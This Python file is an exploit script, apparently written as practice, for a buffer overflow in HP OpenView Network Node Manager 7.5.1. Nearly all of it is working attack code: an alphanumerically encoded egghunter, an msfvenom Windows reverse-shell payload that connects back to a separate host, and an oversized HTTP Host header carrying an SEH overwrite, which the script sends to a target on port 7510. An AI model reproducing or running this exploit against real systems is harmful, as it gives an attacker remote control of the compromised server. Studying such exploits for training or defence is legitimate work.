#!/usr/bin/env python3

# Vuln: HP OpenView Network Node Manager (OV NNM) 7.5.1
# Tyler Boykin

# The following was used in my practice for the exploitation of OV NNM.

# I used the Slink for the egghunter "carve" out.
# https://github.com/ihack4falafel/Slink

# Also incorporated the following resources in learning
# https://greyshell.github.io/blog/2016/11/07/hpnmm-exploit/
# https://www.youtube.com/watch?v=gHISpAZiAm0
# https://nets.ec/Shellcode/Appendix/Alphanumeric_opcode
# https://medium.com/ethical-hacking-blog/alphanumeric-encoding-of-shellcode-40eb2e69a2d6

from struct import pack
import socket
import sys

def p(x):
    return pack('<I',x)

# Align stack
hunter = ""
hunter += "\x54"
hunter += "\x58"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x05\x58\x55\x55\x55"
hunter += "\x50"
hunter += "\x5c"
hunter += "\x5c"

hunter += "\x54"
hunter += "\x58"
hunter += "\x66\x05\x6a\x01"
hunter += "\x50"
hunter += "\x5c"

# Carve out shellcode
hunter += "\x54"
hunter += "\x58"
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x43\x64\x77\x64" ## add  eax, 0x64776443
hunter += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
hunter += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x57\x43\x65\x57" ## add  eax, 0x57654357
hunter += "\x05\x46\x33\x54\x46" ## add  eax, 0x46543346
hunter += "\x05\x45\x32\x64\x45" ## add  eax, 0x45643245
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x21\x33\x46\x75" ## add  eax, 0x75463321
hunter += "\x05\x21\x32\x45\x64" ## add  eax, 0x64453221
hunter += "\x05\x21\x22\x33\x54" ## add  eax, 0x54332221
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x67\x64\x34\x21" ## add  eax, 0x21346467
hunter += "\x05\x56\x54\x33\x21" ## add  eax, 0x21335456
hunter += "\x05\x65\x33\x23\x21" ## add  eax, 0x21233365
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x26\x03\x35\x32" ## add  eax, 0x32350326
hunter += "\x05\x16\x02\x25\x42" ## add  eax, 0x42250216
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x01\x34\x67\x17" ## add  eax, 0x17673401
hunter += "\x05\x01\x24\x66\x17" ## add  eax, 0x17662401
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x17\x32\x32\x35" ## add  eax, 0x35323217
hunter += "\x05\x16\x21\x31\x34" ## add  eax, 0x34312116
hunter += "\x05\x15\x22\x22\x34" ## add  eax, 0x34222215
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax
hunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
hunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
hunter += "\x05\x33\x41\x65\x77" ## add  eax, 0x77654133
hunter += "\x05\x33\x42\x54\x66" ## add  eax, 0x66544233
hunter += "\x05\x33\x31\x44\x55" ## add  eax, 0x55443133
hunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
hunter += "\x50"                 ## push eax

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.102.46 LPORT=123 -e x86/alpha_mixed BufferRegister=EDI -f raw EXITFUNC=seh
buf = "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lm8orePePc0u0lIhe6QKp0dlKv0TpNkF2DLnkCbdTlKSB7XvoX7Cz7VTqKOll7LU1sLc2fL5pZaHO4MVaJgkRxr3baGNkf2b0Nk1ZWLNkBlfq1hzC3x5QKapQlK1IgPeQjsnkW9fxYs7JRinkgDnkS1KfvQkOnLO1zo4MgqyWvXYpD58v7sCM8x5ksMEtaexd1HlKQHvDS1n31vNkTLbklKRxELC1JsLKs4nkwqhPniaTVD5tSkQKpa69cjPQkOkPQOQO2zlKfrjKLM1MsXwC02S0s0ph0w3CVRsof4rHPL2WWVFgYozuMhNp7qs0EPgYZdSdV0BH7Yk0rKS0ioKef00P60bpspV0w0V0QxzJ4O9OYpKOZuMGPj352Hkpy80fFNQxgrs0uP1kK9ivazFp1FSg3Xnyy5ptaq9o8UK5O0444L9oBnuXqezLE8l0oEY2QFyoZue8U3pmRDc0niJC67SgPWTqJV1zfrsi66jBimQviWpD7TgLeQEQLMst144PXFGp2df4rprvF6sfW6CfrnPV1F1CBv2HCIHLUoK69oyEMYkPbnPVcvIoFPqxC8OwuMsPio9EMkinvnGBzJ1xi6MEmmmMIoJuelS6SLWzmPKKIpSEUUmkPGGcPrRO2JuPBsYoiEAA"

OFFSET = 3381
TAIL = 615
pop_pop_ret_1 = p(0x6d343836).decode('latin1')

fuzzstr = ""
fuzzstr += 'A' * (OFFSET - 4)
fuzzstr += "\x48\x48\x77\x04"
fuzzstr += pop_pop_ret_1
fuzzstr += 'A' * 27
fuzzstr += hunter
fuzzstr += 'A' * (TAIL - len(hunter) - 42 - 31 - 13)

request = "GET /topology/homeBaseView HTTP/1.1\r\n"
request += f"Host: {fuzzstr}:7510\r\n"  # Overwrite + POPPOPRET + Conditional Jump + Egghunter
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += "User-Agent: "
request += "W00TW00T"   # Eggtag
request += "DDWX-HUUU-HUUU-HUUUP_"  # Align ESP and re-adjust EDI
request += "\x41" * 19  # Padding for EDI
request += f"{buf}\r\n"
request += "Content-Length: 1048580\r\n\r\n"
request += "W00TW00T"   # Eggtag
request += "DDWX-HUUU-HUUU-HUUUP_" # Align ESP and re-adjust EDI
request += "\x41" * 19  # Padding for EDI
request += f"{buf}"

sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sockfd.connect(("192.168.102.183",7510))
sockfd.send(request.encode('latin1'))
sockfd.close()
